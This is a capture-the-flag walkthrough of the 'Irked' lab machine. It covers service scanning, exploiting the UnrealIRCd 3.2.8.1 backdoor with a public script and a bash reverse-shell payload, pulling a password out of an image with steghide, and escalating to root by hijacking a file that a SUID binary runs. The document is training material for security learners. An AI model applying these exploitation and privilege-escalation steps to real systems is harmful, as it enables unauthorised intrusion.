# recon
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /manual/: Potentially interesting folder
|_http-server-header: Apache/2.4.10 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
111/tcp   open  rpcbind 2-4 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39100/tcp6  status
|   100024  1          43430/udp6  status
|   100024  1          53872/tcp   status
|_  100024  1          57485/udp   status
6697/tcp  open  irc     UnrealIRCd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.32] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
8067/tcp  open  irc     UnrealIRCd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.32] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
53872/tcp open  status  1 (RPC #100024)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
65534/tcp open  irc     UnrealIRCd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.32] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.9 (95%), Linux 3.12 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- `/manual/en/index.html` : Apache HTTP Server Version 2.4 Documentation
I did some more research about port 80 but after a while I have a bad feeling that it is just a rabbit whole. then I move on to another service

## irc
after googling a bit, I found out that we can us HexChat to connect to IRC server. here is how to by [offsec](https://www.offensive-security.com/offsec-irc-guide/)


so download it and then let add newnetwork -> irked.htb/6667. and try to connect to it.
```
* Looking up irked.htb
* Connecting to irked.htb (10.10.10.117:6667)
* Connection failed (Connection refused)
```
oh yea wrong port... `irked.htb/6697`
```
* Your host is irked.htb, running version Unreal3.2.8.1
* This server was created Mon May 14 2018 at 13:12:50 EDT
```
okey we got our version.. let search on `searchsploit`
```
kali@kali:~/HTB$ searchsploit UnrealIRCd
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)         | linux/remote/16922.rb
```
oh there is a metasloit module, but we will try to advoid using that. (let see how it go, lets try harder!!)


so I google a bit more, I found that this vuln is **CVE-2010-2075** and looking for python exploit on github and I found [this](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py), created by Ranger11Danger. let get it and see how it works


dot forget to change local ip + port in the script.
```console
kali@kali:/opt$ sudo python3 unrealIRC.py -h
usage: unrealIRC.py [-h] -payload {python,netcat,bash} ip port

positional arguments:
  ip                    target ip
  port                  target port

optional arguments:
  -h, --help            show this help message and exit
  -payload {python,netcat,bash}
                        set payload type
kali@kali:/opt$ sudo python3 unrealIRC.py irked.htb 6697 -payload bash
Exploit sent successfully!
```
and it works, he deserve some star on his github!!

## foothold + recon
```console
ircd@irked:~/Unreal3.2$ uname -a
uname -a
Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux
ircd@irked:~/Unreal3.2$ ls -la /home/
ls -la /home/
total 16
drwxr-xr-x  4 root     root     4096 May 14  2018 .
drwxr-xr-x 21 root     root     4096 May 15  2018 ..
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 djmardov
drwxr-xr-x  3 ircd     root     4096 May 15  2018 ircd
ircd@irked:/home/djmardov$ ls -la
total 92
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 .
drwxr-xr-x  4 root     root     4096 May 14  2018 ..
lrwxrwxrwx  1 root     root        9 Nov  3  2018 .bash_history -> /dev/null
-rw-r--r--  1 djmardov djmardov  220 May 11  2018 .bash_logout
-rw-r--r--  1 djmardov djmardov 3515 May 11  2018 .bashrc
drwx------ 13 djmardov djmardov 4096 May 15  2018 .cache
drwx------ 15 djmardov djmardov 4096 May 15  2018 .config
drwx------  3 djmardov djmardov 4096 May 11  2018 .dbus
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Desktop
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 Documents
drwxr-xr-x  2 djmardov djmardov 4096 May 14  2018 Downloads
drwx------  3 djmardov djmardov 4096 Nov  3  2018 .gconf
drwx------  2 djmardov djmardov 4096 May 15  2018 .gnupg
-rw-------  1 djmardov djmardov 4706 Nov  3  2018 .ICEauthority
drwx------  3 djmardov djmardov 4096 May 11  2018 .local
drwx------  4 djmardov djmardov 4096 May 11  2018 .mozilla
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Music
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Pictures
-rw-r--r--  1 djmardov djmardov  675 May 11  2018 .profile
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Public
drwx------  2 djmardov djmardov 4096 May 11  2018 .ssh
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Templates
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Videos
ls -la Documents
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
```
okey we can read user.txt but .backup looks juicy
```console
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
<redirected>
```
steg..... hmmm... steganography? but where is the pictures? I check `djmardov/Pictures` but is empty... after few minutes later, I remember that there is a picture on web page, a smily or something. let download it and use steghide find out what djmardov is hidding.
```console
kali@kali:~/HTB/irked.htb$ steghide --help
kali@kali:~/HTB/irked.htb$ steghide extract -sf irked.jpg 
Enter passphrase: 
wrote extracted data to "pass.txt".
kali@kali:~/HTB/irked.htb$ cat pass.txt 
Kab6h+m+bbp2J:HG
```
now let SSH as `djmardov` !!
```
kali@kali:/opt$ ssh djmardov@irked.htb
djmardov@irked.htb's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$
```
grab user flag!!

# root
```console
djmardov@irked:~$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
djmardov@irked:~$ sudo -l
-bash: sudo: command not found
djmardov@irked:~$ which su
/bin/su
```
I check SUID, nothing interesting except
```console
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
```
I ran linpeas.sh, nothing really interesting so let go back to `viewuser`. `scp` and copy it to our kali to examing it more
```
kali@kali:~/HTB/irked.htb$ scp djmardov@irked.htb:/home/djmardov/viewuser viewuser
```
since it is binary, let us `ltrace` to debuging it
```
kali@kali:~/HTB/irked.htb$ ltrace ./viewuser 
<... system resumed> )                                         = 0
setuid(0)                                                      = -1
system("/tmp/listusers"sh: 1: /tmp/listusers: not found
```
so the script execute `/tmp/listusers`, note that the script is setuid(0) before executing it. setuid(0)=root so the plan is hijecting `/tmp/listusers` and make it to get root shell.

back to victim server. now lets modify `/tmp/listusers`
```console
djmardov@irked:/tmp$ ls
systemd-private-0ae59bc557a44e4ca3f371fafd5dfa23-colord.service-pclUZh
systemd-private-0ae59bc557a44e4ca3f371fafd5dfa23-cups.service-R92PM6
systemd-private-0ae59bc557a44e4ca3f371fafd5dfa23-rtkit-daemon.service-HMAyen
vmware-root
djmardov@irked:/tmp$ nano listusers
djmardov@irked:/tmp$ ls
listusers
systemd-private-0ae59bc557a44e4ca3f371fafd5dfa23-colord.service-pclUZh
systemd-private-0ae59bc557a44e4ca3f371fafd5dfa23-cups.service-R92PM6
systemd-private-0ae59bc557a44e4ca3f371fafd5dfa23-rtkit-daemon.service-HMAyen
vmware-root
djmardov@irked:/tmp$ cat listusers 
#!/bin/bash
/bin/bash 
djmardov@irked:/tmp$ chmod +x listusers 
djmardov@irked:/tmp$ /usr/bin/viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-10-08 15:30 (:0)
djmardov pts/0        2020-10-08 16:51 (10.10.14.32)
root@irked:/tmp# cat /root/root.txt
```
GL and Happy HACKing